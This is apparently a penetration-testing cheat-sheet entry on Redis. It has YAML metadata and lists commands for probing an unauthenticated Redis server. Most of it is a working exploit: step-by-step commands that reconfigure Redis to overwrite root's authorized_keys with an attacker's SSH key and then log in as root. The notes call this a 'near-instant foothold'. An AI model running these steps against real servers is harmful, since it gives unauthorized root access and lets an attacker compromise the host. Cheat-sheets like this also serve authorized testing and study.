---
id: redis-enum
title: Redis Enumeration
stage: enumeration
tags: [linux]
tools:
  - redis-cli -h $TARGET ping
  - redis-cli -h $TARGET info
  - redis-cli -h $TARGET config get dir
leads_to:
  - rev-shell
  - ssh-access
---

## Basic Enumeration

```bash
redis-cli -h $TARGET ping        # PONG = open + unauthenticated
redis-cli -h $TARGET info
redis-cli -h $TARGET config get dir
redis-cli -h $TARGET keys '*'
```

## Write SSH Key (if running as root or key-owner)

```bash
# 1. Generate a key pair on attacker
ssh-keygen -t rsa -f /tmp/redis_key -N ''

# 2. Write public key to Redis and save to authorized_keys
redis-cli -h $TARGET
> config set dir /root/.ssh
> config set dbfilename authorized_keys
> set crackit "\n\n$(cat /tmp/redis_key.pub)\n\n"
> save

# 3. SSH in
ssh -i /tmp/redis_key root@$TARGET
```

## Notes

Unauthenticated Redis running as root is a near-instant foothold. The SSH key write trick is the most reliable path. If running as a service user, check what user it runs as via `config get dir`.
